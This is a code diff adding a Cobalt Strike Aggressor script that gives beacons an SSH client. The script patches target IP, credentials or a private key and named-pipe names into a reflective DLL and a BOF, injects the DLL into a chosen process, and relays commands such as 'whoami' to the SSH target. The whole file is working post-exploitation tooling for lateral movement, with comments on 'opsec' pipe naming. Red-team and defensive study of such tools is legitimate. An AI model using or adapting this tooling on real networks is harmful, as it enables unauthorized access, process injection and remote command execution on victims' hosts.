@@ -1,0 +1,606 @@
+import beacon.CommandBuilder;
+
+global('$ssh_inited $pipe_wait $error_1 $ssh_key_stomp_me $artifacts_inited $usage $rssh_dll_name $bof_write_pipe_name $reading_inited $pipe_output_name_final $pipe_input_name_final $pipe_output_stomp_me_name $pipe_input_stomp_me_name $ssh_ip_stomp_me $ssh_username_stomp_me $ssh_password_stomp_me');
+$ssh_inited = -1;
+$reading_inited = -1;
+$artifacts_inited = -1;
+
+$pipe_output_name_final = "BigGasPipe_updater_01_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
+$pipe_input_name_final = "BigGasPipe_updater_02_"; # Change the pipe name an reload the CNA for 'opsec', 25-bytes MAX
+
+$pipe_output_stomp_me_name = "OUTPUT_PIPE_NAME_NO_CHANGE_PLS";
+$pipe_input_stomp_me_name = "INPUT_PIPE_NAME_NO_CHANGE_PLS";
+
+$ssh_key_stomp_me = "SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_C"; # 4108 bytes
+
+$ssh_ip_stomp_me = "999.999.999.999";
+$ssh_username_stomp_me = "USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____";
+$ssh_password_stomp_me = "PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD_STRING_NO_CHANGE_PLS_____";
+
+$pipe_wait = 30000; # Custom timeout
+
+$rssh_dll_name = "dll_rs.shc.x64.dll"; # default name
+$bof_write_pipe_name  = "bof_write_pipe.x64.o";
+$usage = "You must init ssh first. Try: rssh-init <target ip> <username> <password> <optional: pid>";
+$error_1 = "[RSSH] is already initialized.";
+
+# $1 - string
+sub append_random {
+    return $1 . rand(101);
+}
+
+# $1 - bytes where we are going to do the stoming
+# $2 - string we want to stomp
+# $3 - length of the string we want to stomp (for padding)
+# $4 - output string (the string that we're going to stomp with)
+sub stomp-str {
+    local('$bytes $stomp_me_string $stomp_me_string_len $output_string $padded_output_string $padding_needed $null_padding');
+    $bytes = $1;
+    $stomp_me_string = $2;
+    $stomp_me_string_len = $3;
+    $output_string = $4;
+
+    if ($output_string is $null){ # if string we're stomping in is null, just stomp in null bytes
+        $null_padding = "";
+        $i = 0;
+        while ($i < $stomp_me_string_len) {
+            $null_padding = $null_padding . chr(0); # Append an actual null byte
+            $i = $i + 1;
+        }
+
+        $output_string = strrep($bytes, $stomp_me_string, $null_padding);
+        return $output_string;
+    }
+
+    $padding_needed = $stomp_me_string_len - strlen($output_string);
+    $padded_output_string = $output_string;
+    
+    # println("ORIGINAL STRING: " . $stomp_me_string . "LEN: " . strlen($output_string));
+
+    if ($padding_needed > 0) {
+        $null_padding = "";
+        $i = 0;
+        while ($i < $padding_needed) {
+            $null_padding = $null_padding . chr(0); # Append an actual null byte
+            $i = $i + 1;
+        }
+        $padded_output_string = $output_string . $null_padding;
+    } else if ($padding_needed < 0) {
+        println("String of length " . strlen($output_string) . " is longer than max " . $stomp_me_string_len . " bytes!");
+        return; # Important to return if name is too long
+    }
+
+    # println("NEW STRING: " . $output_string);
+
+    # Now use $padded in strrep
+    $output_string = strrep($bytes, $stomp_me_string, $padded_output_string);
+    
+     # println("FINAL STRING: " . $output_string);
+
+    return $output_string;
+}
+
+# $1 - beacon id
+# $2 - target IP address
+# $3 - username
+# $4 - path to ssh key (PEM format)
+alias rssh-generate-client {
+    local('$barch $beacon_id $pid $rdll_path $rdll_path_out $target_ip $target_username $target_password $target_ssh_key_path $target_ssh_key $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
+    $beacon_id = $1;
+    $target_ip = $2; # target ip
+    $target_username = $3;
+    $target_ssh_key_path = $4;
+
+    if($target_ip is $null || $target_username is $null || $target_ssh_key_path is $null){
+        berror($beacon_id , "[RSSH] Invalid arguments");
+        return;
+    }
+
+    if($artifacts_inited > 0){
+        berror($beacon_id , "[RSSH] Artifacts already initialized.");
+        return; 
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
+        return;
+    }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
+
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
+    
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
+
+    $bof_path_out = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # RDLL STOMP IP Address, this is the ip of the SSH server we want to connect to #
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Read SSH key
+    $handle = openf($target_ssh_key_path);
+    $target_ssh_key = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "4108", $target_ssh_key);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
+
+    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_username_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);
+
+    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_password_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $null);
+
+    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path_out);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
+    # Get BOF contents
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $pipe_input_stomp_me_name in strrep
+    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $bof_path_out);
+
+    # Write BOF back down
+    writeb($handle, $bof_data);
+
+    # Close handle
+    closef($handle);
+
+    $artifacts_inited = 1;
+
+    println("[RSSH] RSSH dll" . $rssh_dll_name . " generated into " . getFileProper(script_resource(".")) . "out" . " directory.");
+}
+
+
+# $1 - beacon id
+# $2 - target IP address
+# $3 - username
+# $4 - path to ssh key (PEM format)
+# $5 - process id of injection target (optional)
+alias rssh-key-init {
+    local('$barch $beacon_id $pid $rdll_path $rdll_path_out $target_ip $target_username $target_password $target_ssh_key_path $target_ssh_key $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
+    $beacon_id = $1;
+    $target_ip = $2; # target ip
+    $target_username = $3;
+    $target_ssh_key_path = $4;
+    $pid = $5; # optional PID
+
+    if($ssh_inited > 0){
+        berror($beacon_id , $error_1);
+        return;
+    }
+
+    if($target_ip is $null || $target_username is $null || $target_ssh_key_path is $null){
+        berror($beacon_id , "Invalid arguments");
+        return;
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
+        return;
+    }
+
+    # If pid was not passed in, local injection
+    if ($pid == $null){
+        $pid = beacon_info($beacon_id, "pid");
+    }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
+
+    blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username ." by injecting into process " . $pid . ".");
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
+
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
+    
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
+
+    $bof_path_out = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # RDLL STOMP IP Address, this is the ip of the SSH server we want to connect to #
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Read SSH key
+    $handle = openf($target_ssh_key_path);
+    $target_ssh_key = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "4108", $target_ssh_key);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
+
+    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_username_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);
+
+    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_password_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $null);
+
+    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path_out);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
+    # Get BOF contents
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $pipe_input_stomp_me_name in strrep
+    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $bof_path_out);
+
+    # Write BOF back down
+    writeb($handle, $bof_data);
+
+    # Close handle
+    closef($handle);
+
+    # self-inject the dll
+    bshinject($beacon_id, $pid, $barch, $rdll_path_out);
+
+    $ssh_inited = 1;
+
+    println("[RSSH] SSH server initiated.");
+
+    if($reading_inited < 0){
+
+        # give the pipes a couple of seconds to open
+        bpause($beacon_id, int(5  * 1000));
+
+        # read from the output pipe
+        rssh-read($beacon_id, $null);
+
+        $reading_inited = 1;
+
+    }
+}
+
+# $1 - beacon id
+# $2 - target IP address
+# $3 - username
+# $4 - password
+# $5 - process id of injection target (optional)
+alias rssh-init {
+    local('$barch $beacon_id $pid $rdll_path $rdll_path_out $target_ip $target_username $target_password $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name $bof_path $bof_path_out $bof_data');
+    $beacon_id = $1;
+    $target_ip = $2; # target ip
+    $target_username = $3;
+    $target_password = $4;
+    $pid = $5; # optional PID
+
+    if($ssh_inited > 0){
+        berror($beacon_id , $error_1);
+        return;
+    }
+
+    if($target_ip is $null || $target_username is $null || $target_password is $null){
+        berror($beacon_id , "[RSSH] Invalid arguments");
+        return;
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($beacon_id , "[RSSH] This script only supports x64 processes");
+        return;
+    }
+
+    # If pid was not passed in, local injection
+    if ($pid == $null){
+        $pid = beacon_info($beacon_id, "pid");
+    }
+
+    # Add random number to the pipe names
+    $pipe_input_name_final = append_random($pipe_input_name_final);
+    $pipe_output_name_final = append_random($pipe_output_name_final);
+
+    blog($beacon_id, "[RSSH] SSH client connecting to " . $target_ip . " with " . $target_username . ":" . $target_password ." by injecting into process " . $pid . ".");
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    # The server must have the interface IP, PORT, username, password, input pipe and outputpipe names stomped in 
+    $rdll_path = getFileProper(script_resource("."), "bins", "x64", $rssh_dll_name);
+
+    $rdll_path_out = getFileProper(script_resource("."), "out", "x64", $rssh_dll_name);
+    
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "bins", "x64", $bof_write_pipe_name);
+
+    $bof_path_out = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # RDLL STOMP IP Address, this is the ip of the SSH server we want to connect to #
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_key_stomp_me, "4108", $null);
+
+    # Now use $ssh_ip_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_ip_stomp_me, "15", $target_ip);
+
+    # RDLL STOMP Username that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_username_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_username_stomp_me, "64", $target_username);
+
+    # RDLL STOMP Password that we want to use to try to authenticate to the SSH server  #
+    # Now use $ssh_password_stomp_me in strrep
+    $rdll = stomp-str($rdll, $ssh_password_stomp_me, "64", $target_password);
+
+    # RDLL STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target  #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # RDLL STOMP OUTPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target   #
+    # Now use $pipe_input_stomp_me_name in strrep
+    $rdll = stomp-str($rdll, $pipe_output_stomp_me_name, "30", $pipe_output_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path_out);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # BOF STOMP INPUT PIPE, this is the pipe we use to send commands that are forwarded to the rdll to the target #
+    # Get BOF contents
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    # Now use $pipe_input_stomp_me_name in strrep
+    $bof_data = stomp-str($bof_data, $pipe_input_stomp_me_name, "29", $pipe_input_name_final);
+
+    # Open output handle
+    $handle = openf(">" . $bof_path_out);
+
+    # Write BOF back down
+    writeb($handle, $bof_data);
+
+    # Close handle
+    closef($handle);
+
+    # self-inject the dll
+    bshinject($beacon_id, $pid, $barch, $rdll_path_out);
+
+    $ssh_inited = 1;
+
+    println("[RSSH] SSH server initiated.");
+
+    if($reading_inited < 0){
+
+        # give the pipes a couple of seconds to open
+        bpause($beacon_id, int(2  * 1000));
+
+        # read from the output pipe
+        rssh-read($beacon_id, $null);
+
+        $reading_inited = 1;
+
+    }
+}
+
+# $1 - beacon id
+# $2 - process id of injection target (optional)
+sub rssh-read {
+    local('$barch $beacon_id $pid $cmd $builder $job_type $callback_type $description $job');
+    $beacon_id = $1;
+    $pid = $2; # Optional pid
+    $job_type = 40;
+    $callback_type = 32;
+    $description = "pipe read";
+
+    if($ssh_inited < 0){
+        berror($1, $usage);
+        return;
+    }
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($1, "[RSSH] This script only supports x64 processes");
+        return;
+    }
+
+    # If pid was not passed in, local injection
+    if ($pid == $null){
+        $pid = beacon_info($beacon_id, "pid");
+    }
+
+    # Use command builder to read from pipe
+    $builder = [new CommandBuilder];
+    [$builder setCommand: $job_type];
+    [$builder addInteger: parseNumber($pid)];
+    [$builder addShort: $callback_type];
+    [$builder addShort: $pipe_wait];
+    [$builder addLengthAndString: "\\\\.\\pipe\\" . $pipe_output_name_final];
+    [$builder addLengthAndString: $description];
+    $job = [$builder build];
+    call("beacons.task", $null, $beacon_id, cast($job, 'b'));
+}
+
+# $1 - beacon id
+# $2 - command to execute via ssh
+alias rssh-exec {
+    local('$bid $data $bof $args $bof_path $handle $bof_data');
+    $bid = $1;
+    $data = $2;
+    
+    if($ssh_inited < 0){
+        berror($bid, $usage);
+        return;
+    }
+
+    $args = bof_pack($bid, "z", $data);
+
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # read in the right BOF file
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+    closef($handle);
+
+    # execute it.
+    beacon_inline_execute($bid, $bof_data, "go", $args);
+}
+
+alias rssh-exit {
+    local('$bid $data $bof $args $bof_path $handle $bof_data');
+    $bid = $1;
+    $data = "exit";
+    
+    if($ssh_inited < 0){
+        berror($bid, $usage);
+        return;
+    }
+
+    $args = bof_pack($bid, "z", $data);
+
+    # Build bof path; This needs rework if you want to support x86 for whatever reason
+    $bof_path = getFileProper(script_resource("."), "out", "x64", $bof_write_pipe_name);
+
+    # read in the right BOF file
+    $handle = openf($bof_path);
+    $bof_data = readb($handle, -1);
+    closef($handle);
+
+    # execute it.
+    beacon_inline_execute($bid, $bof_data, "go", $args);
+
+    # reset globals
+    $ssh_inited = -1;
+    $reading_inited = -1;
+}
+
+# --------------------
+# Register the command
+# --------------------
+beacon_command_group(
+	"rssh",
+	"User-Defined SSH Client",
+	"User-implemented reflective DLL that enables SSH communications with a target."
+);
+
+beacon_command_register(
+	"rssh-init",
+	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with credentials. ",
+	"rssh-init <target ip> <username> <password> <optional: pid>",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-key-init",
+	"(64-bit only) Initializes RDLL and BOF to enable SSH session to target host with a private key, and start the SSH client. ",
+	"rssh-init <target ip> <username> <path to private key> <optional: pid>\nex: rssh-key-init 192.0.0.1 my_username 'C:\\My_Path\\id_key'",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-exec",
+	"(64-bit only) Uses a bof to write a command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target.",
+	"rssh-exec <user command>\nex:rssh-exec whoami",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-exit",
+	"(64-bit only) Uses a bof to write the exit command to a pipe that is read by a user implemented reflective DLL and sent to the ssh target. SSH session exits.",
+	"rssh-exit\nex:rssh-exit",
+	"rssh"
+);
+
+beacon_command_register(
+	"rssh-generate-client",
+	"(64-bit only) Builds Server binary with configuration specified in .cna without starting the SSH client.",
+	"rssh-generate-client <target ip> <username> <path to private key>\nex: rssh-generate-client 192.0.0.1 my_username 'C:\\My_Path\\id_key'",
+	"rssh"
+);
